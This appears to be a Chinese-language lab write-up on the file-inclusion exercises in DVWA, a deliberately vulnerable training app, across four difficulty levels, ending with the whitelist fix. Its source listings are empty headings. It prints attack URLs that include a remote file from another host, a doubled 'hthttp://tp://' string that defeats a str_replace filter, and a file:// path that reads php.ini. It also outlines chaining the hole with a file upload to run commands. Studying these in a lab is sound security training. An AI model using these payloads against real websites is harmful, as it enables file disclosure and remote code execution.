四、File inclusion

1.Low

1-1. source

1-2. 注解
1-3. 漏洞分析

  • 对于参数 page 没有任何过滤，可以进行本地文件读取和远程文件读取
  • 本地：http://www.example.com/
  • 远程访问：http://192.168.153.130/dvwa/vulnerabilities/fi/page=http://192.168.5.12/phpinfo.txt,相同域名头下可以获取信息

2.Mid

2-1. source

1-2. 注解
1-3. 漏洞分析

  • 使用 str_replace 函数是极其不安全的，因为可以使用双写绕过替换规则。例如 page=hthttp://tp://192.168.5.12/phpinfo.txt 时，str_replace 函数会将 http://删除，于是 page=http://192.168.5.12/phpinfo.txt，成功执行远程命令。
  • 而且这里只是限制了远程文件包含，但是本地文件包含没有任何过滤

3.High

3-1. source

3-2. 注解

  • fnmatch():判断文件名是否是 file 开头的，
    3-3. 漏洞分析
  • 可以看到，High 级别的代码使用了 fnmatch 函数检查 page 参数，要求 page 参数的开头必须是 file，服务器才会去包含相应的文件。
  • High 级别的代码规定只能包含 file 开头的文件，看似安全，不幸的是我们依然可以利用 file 协议绕过防护策略。http://192.168.153.130/dvwa/vulnerabilities/fi/page=file:///C:/xampp/htdocs/dvwa/php.ini
  • 至于执行任意命令，需要配合文件上传漏洞利用。首先需要上传一个内容为 php 的文件，然后再利用 file 协议去包含上传文件（需要知道上传文件的绝对路径），从而实现任意命令执行。
  1. 预防
  • source
  • 可以看到，Impossible 级别的代码使用了白名单机制进行防护，简单粗暴，page 参数必须为“include.php”、“file1.php”、“file2.php”、“file3.php”之一，彻底杜绝了文件包含漏洞。
